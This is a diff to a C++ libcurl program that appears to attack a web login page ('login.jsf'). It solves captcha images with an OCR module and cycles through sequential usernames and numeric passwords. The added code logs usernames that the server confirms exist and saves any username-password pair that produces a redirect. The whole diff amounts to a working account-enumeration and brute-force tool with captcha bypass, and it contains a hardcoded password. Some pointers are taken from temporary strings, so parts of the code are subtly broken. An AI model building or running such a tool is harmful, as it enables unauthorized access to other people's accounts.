@@ -13,6 +13,7 @@
 #include <dirent.h>
 #include <curl/curl.h>
 #include "CST-self-ocr.hpp"
+#include "password.hpp"
 
 using namespace std;
 
@@ -25,13 +26,21 @@ const char* password             =  "aresame";
 const char* usertype             =  "1";
 
 long times                       =  5L;
-long max_pass                    =  100L;
+long start_pass                  =  0L;
+long start_user                  =  0L;
 
-bool is_debug = false;
-bool is_remove = false;
+int pass_length                  =  6;
+int user_length                  =  9;
+
+bool is_debug                    =  false;
+bool is_remove                   =  false;
 
 string code;
 string content;
+string strpass;
+string struser;
+
+FILE *debug_fp;
 
 
 ////////////////////////////
@@ -71,7 +80,7 @@ long s2l( string str ) {
 }
 
 ////////////////////////////////
-// TIME ////////////////////////
+// GET NAME  ///////////////////
 string get_time( bool is_dir = false ) {
     time_t rawtime;
     struct tm * timeinfo;
@@ -111,6 +120,18 @@ string get_dir_name( ) {
     dir_name += "/";
     return dir_name;
 }
+
+string get_debug_file_name() {
+    string name = "";
+    name += get_time( true );
+    name += ".debug.user";
+    
+    return name;
+}
+
+
+//////////////////////////////////////
+// CONTENT  //////////////////////////
     
 void reset_content() {
     content = "";
@@ -164,6 +185,10 @@ size_t write_callback( void* ptr, size_t size, size_t nmemb, FILE *data ) {
         cout << "\tFIND: no user" << endl;
     } else if ( str.find( str_wrong_password ) != string::npos ) {
         cout << "\tFIND: wrong password!" << endl;
+        
+        // save the result
+        fprintf( debug_fp, "user:  %s\n", struser.c_str() );
+        fprintf( debug_fp, "------------------------\n" );
     }
     // cout << str << endl;
     if ( is_debug ) {
@@ -192,8 +217,16 @@ int main( int argc, char** argv ) {
     int is_debug_opt_len     = (int)strlen( is_debug_opt );
     const char* times_opt    = "--times=";
     int times_opt_len        = (int)strlen( times_opt );
-    const char* max_pass_opt = "--max-pass=";
-    int max_pass_opt_len         = (int)strlen( max_pass_opt );
+    const char* start_pass_opt = "--start-pass=";
+    int start_pass_opt_len   = (int)strlen( start_pass_opt );
+    const char* is_remove_opt = "--remove";
+    int is_remove_opt_len     = (int)strlen( is_remove_opt );
+    const char* pass_length_opt = "--pass-length=";
+    int pass_length_opt_len = (int)strlen( pass_length_opt );
+    const char* start_user_opt = "--start-user=";
+    int start_user_opt_len   = (int)strlen( start_user_opt );
+    const char* user_length_opt = "--user-length=";
+    int user_length_opt_len = (int)strlen( user_length_opt );
     
     // Get the options:
     for ( int i = 0; i < argc; ++i ) {
@@ -211,8 +244,16 @@ int main( int argc, char** argv ) {
             is_debug = true;
         } else if ( strncmp( argv[i], times_opt, times_opt_len ) == 0 ) {
             times = c2l( argv[i] + times_opt_len );
-        } else if ( strncmp( argv[i], max_pass_opt, max_pass_opt_len ) == 0 ) {
-            max_pass = c2l( argv[i] + max_pass_opt_len );
+        } else if ( strncmp( argv[i], start_pass_opt, start_pass_opt_len ) == 0 ) {
+            start_pass = c2l( argv[i] + start_pass_opt_len );
+        } else if ( strncmp( argv[i], is_remove_opt, is_remove_opt_len ) == 0 ) {
+            is_remove = true;
+        } else if ( strncmp( argv[i], pass_length_opt, pass_length_opt_len ) == 0 ) {
+            pass_length = s2i<int>( argv[i] + pass_length_opt_len );
+        } else if ( strncmp( argv[i], user_length_opt, user_length_opt_len ) == 0 ) {
+            user_length = s2i<int>( argv[i] + user_length_opt_len );
+        } else if ( strncmp( argv[i], start_user_opt, start_user_opt_len ) == 0 ) {
+            start_user = c2l( argv[i] + start_user_opt_len );
         }
     }
     
@@ -245,9 +286,12 @@ int main( int argc, char** argv ) {
         return ( -1 );
     }
     
-    for ( long i = 0; i < times; ++i ) {
+    // DEBUG FILE
+    debug_fp = fopen( get_debug_file_name().c_str(), "a+" );
+    
+    for ( long i = 0L; i < times; ++i ) {
         cout << "################## ################## " << i << " ################## ##################" << endl;
-        const char* file_name = get_file_name( i, get_dir_name() ).c_str();
+        const char* file_name = get_file_name( i ).c_str();
         string name(file_name);
         const char* image_file_name = name.c_str();
         
@@ -303,9 +347,20 @@ int main( int argc, char** argv ) {
         curl_easy_reset( curl );
         
         // THIRD: post login.jsf
+        // change password
+        cout << "strat_user: " << start_user << "\ti: " << i << endl;
+        cout << "start_pass: " << start_pass << endl;
+        cout << "user length: " << user_length << endl;
+        cout << "pass length: " << pass_length << endl;
+        username = num2str<T>( start_user + i, user_length ).c_str();
+        password = num2str<T>( start_pass, pass_length ).c_str();
+        struser = username;  // copy username to string
+        strpass = password;  // copy password to string
+                
         reset_content();
         if ( is_debug ) {
             cout << "==== THIRD ====" << endl;
+            cout << "\tusername:  " << username << "\tpassword:  " << password << endl;
             cout << "\tcontent:" << endl;
             cout << "\t" << content << endl;
         }
@@ -319,6 +374,9 @@ int main( int argc, char** argv ) {
         curl_easy_setopt( curl, CURLOPT_POSTFIELDS, content.c_str() );
         
         res = curl_easy_perform( curl );
+        
+        // show username and password
+        cout << "\tusername:  " << username << "\tpassword:  " << strpass << endl;
         
         if ( CURLE_OK == res ) {
             long respcode;
@@ -336,6 +394,14 @@ int main( int argc, char** argv ) {
                         cout << "\t302 CODE" << endl;
                         cout << "\tredirect URL: " << redirect_url << endl;
                     }
+                    
+                    // Save the result
+                    fprintf( debug_fp, "time: %s\n", get_time( true ).c_str() );
+                    fprintf( debug_fp, "username: %s\n", struser.c_str() );
+                    fprintf( debug_fp, "password: %s\n", strpass.c_str() );
+                    fprintf( debug_fp, "--------------------\n" );
+                    
+                    exit( EXIT_SUCCESS );
                 }
             }
         } else {
@@ -355,6 +421,8 @@ int main( int argc, char** argv ) {
         }
     }
     curl_easy_cleanup( curl );
+    
+    fclose( debug_fp );
     
     return 0;
 }
